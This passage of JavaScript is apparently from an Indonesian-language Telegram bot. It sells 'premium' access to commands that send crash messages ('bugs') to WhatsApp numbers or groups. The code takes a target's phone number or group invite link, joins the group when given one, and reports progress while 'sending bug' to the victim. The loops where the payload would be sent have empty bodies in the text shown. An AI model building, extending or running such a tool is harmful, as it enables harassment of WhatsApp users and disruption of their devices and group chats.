Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  for (let i = 0; i <= 70; i++) {
      
      }
console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Ios (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  for (let i = 0; i <= 20; i++) {   
      
      }
console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Group(?:\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const delay = ms => new Promise(res => setTimeout(res, ms));
  if (shouldIgnoreMessage(msg)) return;
if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


  const groupLink = match[1]?.trim();
  if (!groupLink) {
    return bot.sendMessage(
      chatId,
      "­ЪџФ Masukin link grup yang bener!\nContoh: /O-Group https://chat.whatsapp.com/xxxx"
    );
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/.test(groupLink)) {
    return bot.sendMessage(
      chatId,
      "­ЪџФ Link grup salah!\nContoh: /O-Group https://chat.whatsapp.com/xxxx"
    );
  }

  const groupCode = groupLink.split("https://chat.whatsapp.com/")[1];

  try {
    await bot.sendMessage(chatId, "РЈ│ Sedang join grup, tunggu bentar..."); 
    
    const groupJid = await otax.groupAcceptInvite(groupCode);
    await bot.sendMessage(
      chatId,
      "РюЁ Berhasil join grup! Kirim bug sekarang..."
    );
    const target = groupJid;
    await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${groupLink}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: 'Markdown'
  });

  const sent = await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${groupLink}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, { parse_mode: "Markdown" });
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${groupLink}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${groupLink}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${groupLink}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  for (let i = 0; i <= 20; i++) { 
   
      }
    console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${groupLink}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${groupLink}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${groupLink}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Tan (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
